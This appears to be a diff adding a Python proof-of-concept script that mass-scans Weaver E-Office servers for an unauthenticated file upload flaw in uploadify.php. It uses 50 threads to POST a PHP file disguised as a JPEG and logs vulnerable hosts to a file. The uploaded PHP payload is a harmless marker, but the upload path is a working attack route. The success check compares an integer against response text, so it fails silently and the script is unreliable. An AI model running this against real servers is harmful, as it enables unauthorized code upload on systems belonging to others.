@@ -1,0 +1,75 @@
+
+#泛微E-Office uploadify.php后台文件上传漏洞
+
+import argparse,requests,sys,time,re
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+
+def banner():
+    text = ''' '''
+    print(text)
+def main():
+    banner()
+    #设置参数
+    parser = argparse.ArgumentParser(description="泛微E-Office uploadify.php后台文件上传漏洞")
+    parser.add_argument('-u','--url',dest='url',type=str,help="input your url")
+    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
+    args = parser.parse_args()
+    #处理资产，添加线程
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        url_list=[]
+        with open(args.file,'r',encoding='utf-8') as fp:
+            for url in fp.readlines():
+                url_list.append(url.strip())
+        mp=Pool(50)
+        #mp.map(poc, url_list) 的作用是并行地对 url_list 中的每个 URL 执行 poc 函数（或方法）
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"usag:\n\t python {sys.argv[0]} -h")
+
+def poc(target):
+    payload = '/inc/jquery/uploadify/uploadify.php'
+    url = target + payload
+    # print(url)
+    headers = {
+        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36',
+        'Connection':'close',
+        'Content-Length':'259',
+        'Content-Type':'multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4',
+        'Accept-Encoding':'gzip'
+
+    }
+    
+    data = """
+        --e64bdf16c554bbc109cecef6451c26a4
+        Content-Disposition: form-data; name="Filedata"; filename="2TrZmO0y0SU34qUcUGHA8EXiDgN.php"
+        Content-Type: image/jpeg
+
+
+        <?php echo "2TrZmO0y0SU34qUcUGHA8EXiDgN";unlink(__FILE__);?>
+
+
+        --e64bdf16c554bbc109cecef6451c26a4--
+"""
+    proxies = {
+    'http':'http://127.0.0.1:8080',
+    'https':'http://127.0.0.1:8080'
+}
+
+    try:
+        response = requests.post(url=url,headers=headers,data=data,proxies=proxies,timeout=5)
+        if 2384450196 in response.text:
+            print(f'[+]目标存在 {target}')
+            with open('result.txt','a',encoding='utf-8')as f:
+                f.write(target + '\n')
+    except:
+     pass
+
+
+        
+if __name__ == '__main__':
+    main()
